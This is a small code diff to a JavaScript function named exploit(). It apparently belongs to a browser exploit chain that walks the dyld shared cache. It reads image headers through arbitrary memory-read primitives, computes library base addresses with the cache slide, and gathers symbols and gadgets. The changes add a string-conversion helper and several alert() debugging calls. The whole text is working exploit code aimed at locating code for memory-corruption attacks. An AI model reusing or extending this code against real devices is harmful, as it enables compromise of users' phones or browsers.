@@ -681,13 +681,16 @@ function exploit(){
             ];
         
         //print('lookin through cache');
-
+        function ab2str(buf) {
+  return String.fromCharCode.apply(null, new Uint16Array(buf));
+}
         var syms = {};
         var gadgets = {};
         var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
         var nimgs = memory.u32(Add(hdr, 0x1c));
         for(var i = 0; i < nimgs; ++i)
         {
+        
             var m = i * 0x20;
             alert(memory.u32(Add(Add(imgs,m),0x18)))
             var straddr = off2addr(segs, memory.u32(Add(Add(imgs,m),0x18)));
@@ -700,6 +703,7 @@ function exploit(){
 
 
             };
+            alert("dyld image #"+nimgs+":"+ab2str(fn()))
             var base = Add(memory.read_i64(Add(imgs,m),0), cache_slide);
             alert("base" + base);
             //alert(opcode_libs.some())
